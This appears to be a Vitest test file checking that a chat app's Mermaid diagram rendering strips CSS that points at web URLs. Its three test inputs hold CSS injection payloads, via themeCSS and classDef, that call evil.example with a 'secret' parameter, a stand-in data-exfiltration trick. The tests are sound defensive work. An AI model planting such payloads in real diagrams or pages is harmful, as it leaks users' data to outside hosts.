// @vitest-environment jsdom
import { expect, test, vi } from 'vitest'

const matrix = () => ({ a: 1, b: 0, c: 0, d: 1, e: 0, f: 0 })
Object.assign(SVGElement.prototype, {
  getBBox: () => ({ x: 0, y: 0, width: 10, height: 10 }),
  getComputedTextLength: () => 10,
  createSVGMatrix: matrix,
  getScreenCTM: matrix,
})

const { answerHtml } = await import('./drawn')
const { drawing } = await import('../../chat-kit/src/api')

async function drawnAnswer(markdown: string): Promise<string> {
  const before = drawing.version
  answerHtml(markdown)
  await vi.waitFor(() => {
    expect(drawing.version).toBeGreaterThan(before)
  })
  return answerHtml(markdown)
}

const WEB_URL = /url\(\s*["']?(?:[a-z]+:)?\/\//i

test('an init directive with themeCSS in an answer diagram points at nothing on the web', async () => {
  const html = await drawnAnswer(
    '```mermaid\n%%{init: {"themeCSS": "span { background: url(https://evil.example/init?secret=42) }"}}%%\nflowchart TD\n  A[x]\n```',
  )
  expect(html).toContain('<svg')
  expect(html).not.toMatch(WEB_URL)
})

test('a front matter themeCSS in an answer diagram points at nothing on the web', async () => {
  const html = await drawnAnswer(
    '```mermaid\n---\nconfig:\n  themeCSS: "span { background: url(https://evil.example/front?secret=42) }"\n---\nflowchart TD\n  B[x]\n```',
  )
  expect(html).toContain('<svg')
  expect(html).not.toMatch(WEB_URL)
})

test('a classDef in an answer diagram points at nothing on the web', async () => {
  const html = await drawnAnswer(
    '```mermaid\nstateDiagram-v2\n  classDef c background-image:url(https://evil.example/class?secret=42)\n  S:::c\n```',
  )
  expect(html).toContain('<svg')
  expect(html).not.toMatch(WEB_URL)
})
